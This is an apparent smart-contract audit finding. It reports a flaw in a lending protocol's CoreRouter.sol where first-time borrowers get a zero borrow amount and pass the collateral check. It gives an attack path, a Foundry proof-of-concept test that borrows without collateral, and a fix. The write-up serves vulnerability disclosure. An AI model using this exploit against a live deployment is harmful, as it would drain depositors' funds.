# First-time borrowers will drain protocol liquidity by bypassing collateral requirements

### Summary

The improper borrow amount calculation for first-time borrowers will cause unlimited borrowing for users as an attacker will exploit the zero `borrowAmount` calculation on their first borrow to drain protocol liquidity.

### Root Cause

In `CoreRouter.sol:161-163` the borrow amount calculation sets `borrowAmount` to 0 when `currentBorrow.borrowIndex == 0` (first-time borrowers), causing the collateral sufficiency check to always pass.

### Internal Pre-conditions

N/A

### External Pre-conditions

N/A

### Attack Path

1. **Other users deposit collateral, Attacker supplies no collateral**
2. **Attacker calls `CoreRouter::borrow()`** for the first time on any asset with a large amount
3. **The `borrowAmount` calculation returns 0** because `currentBorrow.borrowIndex == 0` for first-time borrowers
4. **The collateral check `require(collateral >= borrowAmount, "Insufficient collateral")` passes** since any collateral amount >= 0
5. **The protocol transfers the full requested borrow amount** to the attacker without proper collateralization

### Impact

First-time borrowers can drain the protocol of all available liquidity in any supported asset by borrowing unlimited amounts with no collateral. The protocol suffers a complete loss of all deposited funds that can be borrowed.

### PoC

Add the following test to `TestBorrowing.t.sol`:

```solidity
function test_borrow_all_no_collateral() public {
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");

    uint256 amount = 1000e18;
    address token = supportedTokens[0];

    vm.startPrank(deployer);

    ERC20Mock(token).mint(user1, amount);
    ERC20Mock(token).mint(user2, amount);

    uint256 initialBalance = IERC20(token).balanceOf(deployer);

    vm.stopPrank();

    vm.startPrank(user1);
    IERC20(token).approve(address(coreRouter), amount);
    coreRouter.supply(amount, token);
    vm.stopPrank();

    vm.startPrank(user2);
    IERC20(token).approve(address(coreRouter), amount);
    coreRouter.supply(amount, token);
    vm.stopPrank();

    vm.startPrank(deployer);

    uint256 borrowAmount = (amount * 110) / 100;

    coreRouter.borrow(borrowAmount, token);

    uint256 finalBalance = IERC20(token).balanceOf(deployer);

    assertGt(finalBalance, initialBalance);
}
```

### Mitigation

Instead of setting `borrowAmount` to 0 when `currentBorrow.borrowIndex == 0` for first-time borrowers, it should be set to `_amount`.
